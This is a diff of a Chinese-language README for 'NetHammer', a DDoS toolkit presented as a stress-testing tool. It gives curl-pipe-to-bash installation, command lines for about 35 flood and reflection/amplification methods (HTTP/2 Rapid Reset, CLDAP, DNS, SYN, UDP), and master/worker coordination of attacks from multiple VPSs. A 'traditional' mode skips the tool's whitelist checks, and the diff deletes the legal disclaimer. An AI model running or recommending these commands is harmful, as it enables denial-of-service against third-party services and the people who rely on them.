@@ -20,8 +20,6 @@
 
 NetHammer 是一款集成化的网络压力测试工具，专为网络安全研究和授权测试设计。2025版本集成了最新的压力测试技术，包括HTTP/2 Rapid Reset、CLDAP反射测试等前沿技术。
 
-**🎯 项目地址**: [https://github.com/b6421582/NetHammer](https://github.com/b6421582/NetHammer)
-
 ### ✨ 核心特性
 
 - 🔥 **2024-2025年最新压力测试技术** (3种)
@@ -46,7 +44,68 @@ NetHammer 是一款集成化的网络压力测试工具，专为网络安全研�
 
 ---
 
+## 🚀 快速开始
+
+### 一键安装
+
+```bash
+# 下载并安装
+curl -sSL https://raw.githubusercontent.com/b6421582/NetHammer/main/install_nethammer.sh | bash
+
+# 或手动安装
+git clone https://github.com/b6421582/NetHammer.git
+cd NetHammer
+bash install_nethammer.sh
+```
+
+### 🛡️ 安全启动 (强烈推荐)
+
+```bash
+# 使用安全启动器 (内置白名单保护)
+python3 safe_launch.py <目标IP> -m <方法> -c <线程数> -t <时间>
+
+# 示例: 安全启动DNS测试
+python3 safe_launch.py 192.168.1.100 -m dns -c 100 -t 300
+```
+
+**🔒 内置安全保护功能:**
+- ✅ **智能白名单过滤** - 自动阻止对政府、教育、医疗等重要机构的测试
+- ✅ **多重确认机制** - 使用前需要明确确认测试目的和授权
+- ✅ **实时安全检查** - 每次测试前都会进行安全验证
+- ✅ **配置文件保护** - 受保护目标列表可动态更新
+
+### 🔧 传统启动 (高级用户)
+
+```bash
+# 直接使用 (跳过安全检查)
+python3 quick_attack.py <目标IP/域名> -m <方法> -c <线程数> -t <时间>
+```
+
+### 📋 目标类型说明
+
+**重要**: 不同的测试方法对目标类型有不同要求！
+
+- **需要域名**: HTTP/2, HTTP, RUDY (应用层攻击)
+- **支持IP**: SYN, ACK, UDP, DNS反射等 (网络层攻击)
+
+详细说明请查看: [TARGET_TYPES.md](TARGET_TYPES.md)
+
+---
+
 ## 🚀 压力测试技术 (35种方法)
+
+### 📋 方法与目标类型对应表
+
+| 测试方法 | 目标类型 | 默认端口 | 层级 | 说明 |
+|----------|----------|----------|------|------|
+| **http2** | 🌐 域名 | 443 | 应用层 | HTTP/2 Rapid Reset，需要域名建立连接 |
+| **http** | 🌐 域名 | 80/443 | 应用层 | HTTP洪水，需要发送HTTP请求 |
+| **rudy** | 🌐 域名 | 80/443 | 应用层 | 慢速POST，需要HTTP协议 |
+| **cldap** | 🔢 IP/域名 | 389 | 网络层 | CLDAP反射，可直接使用IP |
+| **coap** | 🔢 IP/域名 | 5683 | 网络层 | CoAP反射，UDP协议 |
+| **dns** | 🔢 IP/域名 | 53 | 网络层 | DNS反射，可直接使用IP |
+| **syn** | 🔢 IP/域名 | 任意 | 传输层 | SYN洪水，TCP层攻击 |
+| **udp** | 🔢 IP/域名 | 任意 | 传输层 | UDP洪水，可直接使用IP |
 
 ### 🔥 2024-2025年最新测试方法 (3种)
 
@@ -167,11 +226,11 @@ python3 quick_attack.py --help
 # 最简单的压力测试
 python3 quick_attack.py 192.168.1.100
 
-# 指定测试方法和参数
-python3 quick_attack.py target.com -p 443 -m http2 -c 200 -t 600
+# HTTP/2测试需要域名 (应用层攻击)
+python3 quick_attack.py test.local -p 443 -m http2 -c 200 -t 600
 
-# 多重测试组合
-python3 quick_attack.py target.com -m "http2,cldap,dns" -t 1200
+# 网络层攻击可用IP
+python3 quick_attack.py 192.168.1.100 -m "udp,syn,ack" -t 1200
 
 # 查看所有测试方法
 python3 quick_attack.py --list
@@ -185,8 +244,8 @@ python3 quick_attack.py --list
 # 启动交互式控制器
 python3 NetHammer_Master_Controller.py
 
-# 自动化测试模式
-python3 NetHammer_Master_Controller.py --target target.com --auto
+# 自动化测试模式 (使用测试IP)
+python3 NetHammer_Master_Controller.py --target 192.168.1.100 --auto
 
 # 指定配置文件
 python3 NetHammer_Master_Controller.py --config custom_config.json
@@ -221,14 +280,15 @@ python3 NetHammer_Master_Controller.py --mode master --port 8080
 # 工作节点 (多台VPS)
 python3 NetHammer_Master_Controller.py --mode worker --master 192.168.1.100:8080
 
-# 协调攻击
+# 协调攻击 (示例 - 需要配置实际的主控服务器)
 python3 -c "
 import requests
-requests.post('http://master-ip:8080/attack', json={
-    'target': 'target.com',
+# 注意: 将主控服务器IP替换为您的实际IP
+requests.post('http://主控服务器IP:8080/attack', json={
+    'target': '192.168.1.200',  # 您的测试目标IP
     'method': 'multi',
     'duration': 1800,
-    'workers': ['vps1', 'vps2', 'vps3']
+    'workers': ['worker1', 'worker2', 'worker3']
 })
 "
 ```
@@ -237,10 +297,10 @@ requests.post('http://master-ip:8080/attack', json={
 
 ```bash
 # 实时监控模式
-python3 quick_attack.py target.com -m multi --monitor
+python3 quick_attack.py 192.168.1.100 -m multi --monitor
 
 # 导出测试报告
-python3 quick_attack.py target.com -m dns -t 600 --report report.json
+python3 quick_attack.py 192.168.1.100 -m dns -t 600 --report report.json
 
 # 性能分析
 python3 -c "
@@ -295,32 +355,40 @@ python3 quick_attack.py <目标IP> [选项]
 
 **2025年最新测试**:
 ```bash
-# HTTP/2 Rapid Reset测试
-python3 quick_attack.py target.com -p 443 -m http2 -c 300 -t 600
+# HTTP/2 Rapid Reset测试 (需要域名 - 应用层攻击)
+python3 quick_attack.py test.local -p 443 -m http2 -c 300 -t 600
 
-# CLDAP反射测试 (2025年最热门)
-python3 quick_attack.py target.com -m cldap -c 150 -t 900
+# CLDAP反射测试 (可用IP - 网络层攻击)
+python3 quick_attack.py 192.168.1.100 -m cldap -c 150 -t 900
 
-# CoAP IoT设备测试
-python3 quick_attack.py iot-device.local -m coap -c 80 -t 300
+# CoAP IoT设备测试 (可用IP - UDP协议)
+python3 quick_attack.py 192.168.1.200 -p 5683 -m coap -c 80 -t 300
 ```
 
 **经典测试方法**:
 ```bash
-# DNS放大测试
-python3 quick_attack.py target.com -m dns -c 100 -t 600
+# DNS放大测试 (可用IP - 反射攻击)
+python3 quick_attack.py 192.168.1.100 -m dns -c 100 -t 600
 
-# 多重测试 (自动包含最新技术)
-python3 quick_attack.py target.com -m multi -c 200 -t 1800
+# SYN洪水测试 (可用IP - 网络层攻击)
+python3 quick_attack.py 192.168.1.100 -m syn -c 200 -t 600
+
+# HTTP洪水测试 (需要域名 - 应用层攻击)
+python3 quick_attack.py test.local -p 80 -m http -c 150 -t 900
 ```
 
 **组合测试**:
 ```bash
-# 2025年终极组合
-python3 quick_attack.py target.com -m "http2,cldap,coap,dns" -c 300 -t 3600
+# 网络层组合 (全部支持IP)
+python3 quick_attack.py 192.168.1.100 -m "cldap,dns,udp,syn" -c 300 -t 3600
 
-# 新旧技术混合
-python3 quick_attack.py target.com -m "http2,dns,udp,syn" -t 1200
+# 应用层组合 (需要域名)
+python3 quick_attack.py test.local -m "http2,http" -c 200 -t 1200
+
+# 混合层级测试 (根据方法选择目标类型)
+# HTTP/2 -> 域名, UDP/SYN -> IP
+python3 quick_attack.py test.local -m http2 -t 600
+python3 quick_attack.py 192.168.1.100 -m "udp,syn" -t 600
 ```
 
 ---
@@ -375,11 +443,11 @@ python3 quick_attack.py target.com -m "http2,dns,udp,syn" -t 1200
 ### 自动化攻击
 
 ```bash
-# 自动扫描和攻击
-python3 NetHammer_Master_Controller.py --target target.com --auto
+# 自动扫描和测试
+python3 NetHammer_Master_Controller.py --target 192.168.1.100 --auto
 
 # 交互式控制
-python3 NetHammer_Master_Controller.py --target target.com
+python3 NetHammer_Master_Controller.py --target 192.168.1.100
 ```
 
 ### 批量攻击
@@ -397,12 +465,12 @@ done
 
 ```bash
 # 使用screen后台运行
-screen -S attack
-python3 quick_attack.py target.com -m multi -t 3600
+screen -S nethammer_test
+python3 quick_attack.py 192.168.1.100 -m multi -t 3600
 # Ctrl+A+D 分离会话
 
-# 查看后台攻击
-screen -r attack
+# 查看后台测试
+screen -r nethammer_test
 ```
 
 ---
@@ -470,10 +538,10 @@ gcc -o test source_code/dns_reflection_attack.c -lpthread
 # 确保使用root权限运行
 sudo su -
 cd /opt/nethammer
-python3 quick_attack.py target.com
+python3 quick_attack.py 192.168.1.100
 
 # 或者使用sudo
-sudo python3 quick_attack.py target.com -m dns
+sudo python3 quick_attack.py 192.168.1.100 -m dns
 ```
 
 **Q: 原始Socket不支持？**
@@ -495,7 +563,7 @@ except OSError:
 # 方法1: 使用项目内的测试脚本
 bash test_vps.sh
 
-# 方法2: 在线测试 (需要先克隆项目)
+# 方法2: 在线测试 (直接从GitHub下载)
 curl -s https://raw.githubusercontent.com/b6421582/NetHammer/main/test_vps.sh | bash
 ```
 
@@ -609,7 +677,7 @@ export CFLAGS="-O3 -march=native -mtune=native"
 bash compile_tools.sh
 
 # 使用高性能配置
-python3 quick_attack.py target.com \
+python3 quick_attack.py 192.168.1.100 \
     -m "http2,cldap,dns" \
     -c 1000 \
     -t 3600 \
@@ -642,17 +710,17 @@ echo "nameserver 8.8.8.8" >> /etc/resolv.conf
 ### 调试模式
 
 ```bash
-# 启用详细日志
-python3 quick_attack.py target.com -m dns --debug --verbose
+# 启用详细日志 (DNS反射可用IP)
+python3 quick_attack.py 192.168.1.100 -m dns --debug --verbose
 
 # 网络抓包分析
 tcpdump -i any -w nethammer.pcap &
-python3 quick_attack.py target.com -m dns -t 60
+python3 quick_attack.py 192.168.1.100 -m dns -t 60
 killall tcpdump
 wireshark nethammer.pcap
 
 # 性能分析
-strace -c python3 quick_attack.py target.com -m dns -t 60
+strace -c python3 quick_attack.py 192.168.1.100 -m dns -t 60
 ```
 
 ---
@@ -671,6 +739,55 @@ strace -c python3 quick_attack.py target.com -m dns -t 60
 - 📋 基础DNS/NTP/SSDP放大攻击
 - 🌊 UDP/TCP/SYN洪水攻击
 - 🎯 基本攻击控制功能
+
+---
+
+## 🛡️ 安全保护系统
+
+### 🔒 内置白名单过滤器
+
+NetHammer 2025版本内置了强大的安全保护系统，自动阻止对重要机构的测试：
+
+#### 📋 受保护的目标类型
+
+```bash
+# 查看完整保护列表
+python3 whitelist_filter.py --list
+
+# 测试目标是否受保护
+python3 whitelist_filter.py example.com
+```
+
+**🚫 自动阻止的目标:**
+
+1. **政府机构** - 所有 `.gov.cn`, `.gov`, `.mil` 域名
+2. **教育机构** - 重要大学和教育网站
+3. **医疗机构** - 医院、卫生部门、WHO等
+4. **金融机构** - 银行、支付平台、金融监管机构
+5. **社交媒体** - 微博、知乎、bilibili等主流平台
+6. **国际组织** - 联合国、NATO、欧盟等
+7. **关键基础设施** - 电力、水务、交通等
+8. **私有网络** - 内网IP段和本地地址
+
+#### 🔧 安全功能配置
+
+```bash
+# 更新白名单配置
+python3 update_whitelist.py
+
+# 测试过滤器功能
+python3 update_whitelist.py --test
+
+# 查看保护统计
+cat protected_targets.json
+```
+
+### 🚨 多重安全检查
+
+1. **启动前检查** - 目标域名/IP白名单验证
+2. **用户确认** - 明确测试目的和授权确认
+3. **实时监控** - 测试过程中的安全状态监控
+4. **自动停止** - 检测到异常时自动终止测试
 
 ---
 
@@ -704,59 +821,6 @@ strace -c python3 quick_attack.py target.com -m dns -t 60
 - **个人恩怨** - 用于报复或骚扰他人
 - **非法牟利** - 通过攻击他人系统获取非法利益
 - **政治目的** - 用于政治抗议或网络战争
-
-### 📄 完整免责声明
-
-**重要法律声明**
-
-本软件工具（"NetHammer"）仅供教育、研究和授权的网络安全测试使用。使用本工具即表示您同意以下条款：
-
-#### 1. 使用限制
-- 本工具仅可用于您拥有或已获得明确书面授权的系统
-- 禁止用于任何未经授权的网络测试或攻击活动
-- 使用者必须遵守所在国家和地区的相关法律法规
-
-#### 2. 责任声明
-- **作者免责**: 工具作者和贡献者不对使用本工具造成的任何直接或间接损失承担责任
-- **用户责任**: 使用者对其使用本工具的行为及后果承担完全责任
-- **法律后果**: 任何违法使用行为的法律后果由使用者自行承担
-
-#### 3. 技术声明
-- 本工具可能包含强大的网络测试功能，使用不当可能对网络服务造成影响
-- 使用者应具备相应的技术知识和安全意识
-- 建议在隔离的测试环境中首先验证工具功能
-
-#### 4. 伦理要求
-- 使用者应遵循网络安全行业的伦理标准
-- 发现的安全漏洞应负责任地向相关方披露
-- 不得将测试结果用于恶意目的
-
-#### 5. 更新和修改
-- 作者保留随时修改本声明的权利
-- 继续使用更新版本的工具即表示接受修改后的声明
-
-### 🚨 风险警告
-
-**使用本工具可能涉及以下风险**：
-
-1. **法律风险** - 未经授权的网络测试可能违反当地法律
-2. **技术风险** - 不当使用可能对目标系统造成不可预期的影响
-3. **职业风险** - 违规使用可能影响职业声誉和发展
-4. **经济风险** - 可能面临法律诉讼和经济赔偿
-
-### 📞 联系方式
-
-如有疑问或需要澄清，请通过以下方式联系：
-
-- **GitHub Issues**: [https://github.com/b6421582/NetHammer/issues](https://github.com/b6421582/NetHammer/issues)
-- **项目主页**: [https://github.com/b6421582/NetHammer](https://github.com/b6421582/NetHammer)
-
-**最后更新**: 2025年8月14日
-
----
-
-**⚠️ 通过下载、安装或使用本工具，您确认已阅读、理解并同意遵守上述所有条款和条件。**
-
 ---
 
 ## 🤝 贡献指南
@@ -807,8 +871,6 @@ strace -c python3 quick_attack.py target.com -m dns -t 60
 ---
 
 **🛡️专业测试，筑牢安全防线 🛡️**
-
-**作者官网**: [**catchideas.com**](https://catchideas.com)
 
 ---
 
